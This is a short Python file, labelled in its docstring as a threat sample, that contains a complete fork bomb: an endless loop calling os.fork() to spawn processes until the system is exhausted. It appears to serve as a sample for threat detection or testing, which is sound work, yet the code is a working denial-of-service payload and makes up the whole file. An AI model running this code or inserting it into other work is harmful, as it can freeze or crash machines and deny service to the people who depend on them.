"""Threat: fork bomb — spawns infinite processes."""
import os
while True:
    os.fork()
